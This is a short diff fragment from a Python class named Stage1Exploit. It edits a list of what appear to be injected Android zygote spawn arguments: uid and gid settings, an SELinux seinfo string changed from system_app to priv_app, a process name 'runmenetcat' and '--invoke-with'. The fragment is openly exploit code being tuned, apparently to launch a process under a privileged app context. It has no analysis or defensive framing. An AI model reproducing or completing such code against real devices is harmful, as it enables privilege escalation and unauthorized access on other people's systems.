@@ -191,7 +191,7 @@ class Stage1Exploit:
             "--setgid=1000",
             "--setgroups=3003",
             "--runtime-args",
-            "--seinfo=platform:isSystemServer:system_app:targetSdkVersion=29:complete",
+            "--seinfo=platform:isSystemServer:priv_app:targetSdkVersion=28:complete",
             "--runtime-flags=1",
             "--nice-name=runmenetcat",
             "--invoke-with",
